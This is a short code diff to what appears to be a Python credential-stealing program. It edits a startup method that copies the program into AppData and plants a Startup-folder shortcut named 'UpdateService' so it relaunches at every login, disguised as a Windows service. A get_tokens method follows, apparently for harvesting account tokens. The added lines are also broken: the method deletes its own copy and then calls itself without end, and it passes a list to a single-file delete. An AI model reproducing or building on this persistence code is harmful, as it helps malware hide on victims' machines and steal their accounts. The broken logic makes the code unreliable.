@@ -116,11 +116,19 @@ class main():
 	def startup(self):
 		if not os.path.exists(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink"):
 			shutil.copytree(os.getcwd(), fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
+			os.rmdir(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService"); self.startup()
 			shell = win32com.client.Dispatch("WScript.Shell")
 			shortcut = shell.CreateShortCut(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
+			shortcut.IconLocation = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
 			shortcut.Targetpath = fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService\{self.filename}"
 			shortcut.save()
-		
+		else:
+			os.remove(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateService.Ink")
+			for root, subdirs, files in os.walk(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService"):
+				os.remove(files)
+			os.rmdir(fr"C:\Users\{os.getlogin()}\Appdata\Roaming\Microsoft\UpdateService")
+
+
 
 	def get_tokens(self, path):
 		cleaned = []
